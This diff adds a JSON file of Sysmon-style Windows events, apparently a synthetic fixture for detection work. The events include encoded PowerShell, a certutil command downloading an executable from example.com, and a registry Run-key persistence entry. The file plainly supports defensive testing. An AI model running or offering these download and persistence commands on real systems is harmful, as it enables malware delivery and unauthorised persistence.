@@ -1,0 +1,50 @@
+[
+  {
+    "EventID": 1,
+    "UtcTime": "2026-08-12 10:15:23.421",
+    "Computer": "DESKTOP-SEC01",
+    "User": "DESKTOP-SEC01\\analyst",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -EncodedCommand SGVsbG9Xb3JsZA==",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ProcessId": 4520,
+    "ParentProcessId": 3180
+  },
+  {
+    "EventID": 3,
+    "UtcTime": "2026-08-12 10:16:01.112",
+    "Computer": "DESKTOP-SEC01",
+    "User": "DESKTOP-SEC01\\analyst",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -EncodedCommand SGVsbG9Xb3JsZA==",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ProcessId": 4520,
+    "ParentProcessId": 3180,
+    "DestinationIp": "192.168.1.50",
+    "DestinationPort": 443
+  },
+  {
+    "EventID": 11,
+    "UtcTime": "2026-08-12 10:17:45.890",
+    "Computer": "DESKTOP-SEC01",
+    "User": "DESKTOP-SEC01\\analyst",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://example.com/file.exe",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "ProcessId": 4680,
+    "ParentProcessId": 4520,
+    "TargetFilename": "C:\\Users\\analyst\\Downloads\\file.exe"
+  },
+  {
+    "EventID": 13,
+    "UtcTime": "2026-08-12 10:18:20.333",
+    "Computer": "DESKTOP-SEC01",
+    "User": "DESKTOP-SEC01\\analyst",
+    "Image": "C:\\Windows\\System32\\reg.exe",
+    "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "ProcessId": 4800,
+    "ParentProcessId": 3180,
+    "RegistryTarget": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+  }
+]
